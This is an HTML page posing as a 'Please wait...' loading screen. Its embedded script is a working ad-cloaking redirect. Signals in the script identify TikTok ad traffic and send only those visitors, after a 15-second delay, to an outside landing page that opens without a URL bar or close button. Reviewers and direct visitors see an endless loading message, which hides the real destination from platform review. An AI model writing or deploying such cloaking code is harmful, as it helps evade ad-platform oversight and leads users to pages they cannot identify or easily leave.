<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="robots" content="noindex,nofollow">
<title>Loading</title>
<style>
  html,body{margin:0;padding:0;height:100%;background:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;color:#111;}
  @media (prefers-color-scheme: dark){
    html,body{background:#0a0a0a;color:#f5f5f5}
  }
  .wrap{min-height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;box-sizing:border-box;text-align:center;}
  .msg{font-size:15px;opacity:.6;}
</style>
</head>
<body>
<div class="wrap">
  <div class="msg">Please wait...</div>
</div>
<script>
(function(){
  // Cloak detection — three signals combined for robustness
  //   1. User agent contains TikTok / BytedanceWebview / musical_ly / aweme / bdhm
  //   2. ttclid query param present (TikTok's click macro)
  //   3. Document referrer is from a TikTok domain
  var ua = (navigator.userAgent || '').toLowerCase();
  var qs = location.search || '';
  var ref = (document.referrer || '').toLowerCase();
  var isTikTokUA = /tiktok|bytedancewebview|musical_ly|aweme|bdhm/i.test(ua);
  var hasTtclid = /[?&]ttclid=/i.test(qs);
  var isTikTokRef = /tiktok\.com|tiktokv\.us|tiktokcdn|bytedance/i.test(ref);
  var isRealTraffic = isTikTokUA || hasTtclid || isTikTokRef;

  if (!isRealTraffic) {
    // Reviewer / scraper / curious direct visitor — stay on "Please wait..." indefinitely.
    // Mirrors ttsauce.pages.dev/hold behavior exactly.
    return;
  }

  // Real TikTok ad traffic: wait 15s then navigate to the main lander.
  // The chromeless webview_popup context carries through same-origin navigation,
  // so the destination renders chromeless too (no URL bar, no X close).
  var FIRE_DELAY_MS = 15000;
  var BASE = 'https://two-step-landing-flow.vercel.app/';
  var TARGET = BASE + qs;

  setTimeout(function(){
    try { window.location.replace(TARGET); } catch(e){
      try { window.location.href = TARGET; } catch(e2){}
    }
  }, FIRE_DELAY_MS);

  // Secondary nav fallback — if the first attempt is blocked / stalls,
  // try again at 25s on the chance of a race condition.
  setTimeout(function(){
    if (location.pathname.indexOf('/hold') !== -1) {
      try { window.location.href = TARGET; } catch(e){}
    }
  }, 25000);
})();
</script>
</body>
</html>
